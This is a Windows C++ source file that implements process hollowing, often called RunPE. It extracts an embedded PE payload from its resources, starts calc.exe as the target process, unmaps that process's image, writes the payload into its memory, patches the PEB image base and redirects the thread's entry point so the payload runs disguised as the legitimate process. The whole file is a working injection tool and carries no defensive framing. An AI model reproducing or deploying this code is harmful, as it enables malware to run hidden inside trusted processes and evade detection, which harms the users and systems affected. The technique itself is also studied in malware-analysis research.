#include <windows.h>
#include <stdio.h>

#include "resource.h"
#include "createproc.h"
#include "ntdll_undoc.h"
#include "relocate.h"

BYTE* get_raw_payload(OUT SIZE_T &res_size)
{
    HMODULE hInstance = GetModuleHandle(NULL);
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(MY_RESOURCE), RT_RCDATA);
    if (!res) return NULL;

    HGLOBAL res_handle  = LoadResource(NULL, res);
    if (res_handle == NULL) return NULL;

    BYTE* res_data = (BYTE*) LockResource(res_handle);
    res_size = SizeofResource(NULL, res);

    BYTE* out_buf = (BYTE*) VirtualAlloc(NULL,res_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(out_buf, res_data, res_size);

    FreeResource(res_handle);
    return out_buf;
}

bool is_system32b()
{
    if (sizeof(LPVOID) == sizeof(DWORD)) {
        return true;
    }
    return false;
}

bool copy_pe_to_virtual(BYTE* payload, SIZE_T payload_size, LPVOID baseAddress, HANDLE hProcess)
{
    if (payload == NULL) return false;

    IMAGE_NT_HEADERS* payload_nt_hdr = get_nt_hrds(payload);
    if (payload_nt_hdr == NULL) {
        printf("Invalid payload: %p\n", payload);
        return false;
    }

    DWORD written = 0;

    //copy payload's headers:
    const DWORD kHdrsSize = payload_nt_hdr->OptionalHeader.SizeOfHeaders;
    if (!WriteProcessMemory(hProcess, baseAddress, payload, kHdrsSize, &written)) {
        return false;
    }
    if (written != kHdrsSize) return false;

    printf("Copied payload's headers to: %p\n", baseAddress);

    LPVOID secptr = &(payload_nt_hdr->OptionalHeader);
    const DWORD kOptHdrSize = payload_nt_hdr->FileHeader.SizeOfOptionalHeader;

    //copy all the sections, one by one:
    secptr = LPVOID((DWORD) secptr + kOptHdrSize);

    printf("Coping sections:\n");
    for (WORD i = 0; i < payload_nt_hdr->FileHeader.NumberOfSections; i++) {
       PIMAGE_SECTION_HEADER next_sec = (PIMAGE_SECTION_HEADER)((DWORD)secptr + (IMAGE_SIZEOF_SECTION_HEADER * i));

       LPVOID section_place = (BYTE*) baseAddress + next_sec->VirtualAddress;
       LPVOID section_raw_ptr = payload + next_sec->PointerToRawData;

       if (!WriteProcessMemory(hProcess, section_place, section_raw_ptr, next_sec->SizeOfRawData, &written)) {
           return false;
       }
       if (written != next_sec->SizeOfRawData) return false;
       printf("[+] %s to: %p\n", next_sec->Name, section_place);
    }
    return true;
}
/*
runPE32

targetPath - application where we want to inject
payload - buffer with raw image of PE that we want to inject
payload_size - size of the above

desiredBase - where we prefer to map the payload in the target memory; NULL is we don't care
unmap_target - do we want to unmap the target? (we are not forced to do it if it doesn't disturb our chosen base)
*/

bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, DWORD desiredBase = NULL, bool unmap_target = false)
{
    //check payload:
    IMAGE_NT_HEADERS* payload_nt_hdr = get_nt_hrds(payload);
    if (payload_nt_hdr == NULL) {
        printf("Invalid payload: %p\n", payload);
        return false;
    }

    const SIZE_T kPtrSize = sizeof(LPVOID);
    if (kPtrSize != sizeof(DWORD)) {
        printf("System is not 32 bit\n");
        //TODO: support 64 bit
        return false;
    }

    const LONG oldImageBase = payload_nt_hdr->OptionalHeader.ImageBase;
    DWORD payloadImageSize = payload_nt_hdr->OptionalHeader.SizeOfImage;

    //create tatet process:
    PROCESS_INFORMATION pi;
    if (!create_new_process1(targetPath, pi)) return false;
    printf("PID: %d\n", pi.dwProcessId);

    //get initial context of the target:
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);
    
    //get image base of the target:
    DWORD targetImageBase;
    DWORD PEB = context.Ebx;

    if (!ReadProcessMemory(pi.hProcess, LPVOID(PEB + 8), &targetImageBase, kPtrSize, NULL)) {
        return false;
    }
    printf("targetImageBase = %x\n", targetImageBase);

    if (has_relocations(payload) == false) {
        //payload have no relocations, so we are bound to use it's original image base
        desiredBase = payload_nt_hdr->OptionalHeader.ImageBase;
    }
    
    if (unmap_target || targetImageBase == desiredBase) {
        //unmap the target:
        if (_NtUnmapViewOfSection(pi.hProcess, (PVOID)targetImageBase) != ERROR_SUCCESS) {
            printf("Unmapping the target failed!\n");
            return false;
        }
    }
    
    //try to allocate space that will be the most suitable for the payload:
    bool needs_reloc = false;

    LPVOID remoteAddress = VirtualAllocEx(pi.hProcess, (LPVOID) desiredBase, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteAddress == NULL)  {
        printf("Could not allocate memory in the remote process\n");
        return false;
    }
    printf("Allocated remote ImageBase: %p size: %x\n", remoteAddress,  payloadImageSize);

    //change the image base saved in headers - this is very important for loading imports:
    payload_nt_hdr->OptionalHeader.ImageBase = (DWORD) remoteAddress;

    LPVOID localCopyAddress = VirtualAllocEx(GetCurrentProcess(), NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);;
    if (localCopyAddress == NULL) {
        printf("Could not allocate memory in the current process\n");
        return false;
    }
    printf("Allocated local memory: %p size: %x\n", localCopyAddress,  payloadImageSize);

    if (!copy_pe_to_virtual(payload, payload_size, localCopyAddress, GetCurrentProcess())) {
        printf("Could not copy PE file\n");
        return false;
    }

    //if the base address of the payload changed, we need to apply relocations:
    if ((LONG)remoteAddress != oldImageBase) {
        if (apply_relocations((LONG)remoteAddress, oldImageBase, localCopyAddress) == false) {
            printf("[ERROR] Could not relocate image!\n");
            return false;
        }
    }

     DWORD written = 0;
    // paste the local copy of the prepared image into the reserved space inside the remote process:
    if (!WriteProcessMemory(pi.hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written) || written != payloadImageSize) {
        printf("[ERROR] Could not paste the image into remote process!\n");
        return false;
    }

    //overwrite ImageBase stored in PEB
    if (!WriteProcessMemory(pi.hProcess, LPVOID(PEB + 8), &remoteAddress, kPtrSize, &written) || written != kPtrSize) {
        printf("Failed overwriting PEB: %d\n", written);
        return false;
    }

    //overwrite context: sent new Entry Point
    DWORD newEP = (DWORD) remoteAddress + payload_nt_hdr->OptionalHeader.AddressOfEntryPoint;
    printf("newEP: %p\n", newEP);
    context.Eax = newEP;
    SetThreadContext(pi.hThread, LPCONTEXT(&context));

    printf("--\n");
    ResumeThread(pi.hThread);
    return true;
}

int main(int argc, char *argv[])
{
    load_ntdll_functions();

    BYTE* res_data = NULL;
    SIZE_T res_size = 0;

    if ((res_data = get_raw_payload(res_size)) == NULL) {
        printf("Failed!\n");
        return -1;
    }

    WCHAR targetPath[MAX_PATH];
    if (!get_calc_path(targetPath, MAX_PATH)) {
        return -1;
    }

    if (runPE32(targetPath, res_data, res_size)) {
        printf("Injected!\n");
    } else {
        printf("Injection failed\n");
    }
    VirtualFree(res_data, res_size, MEM_RELEASE);
    system("pause");
    return 0;
}
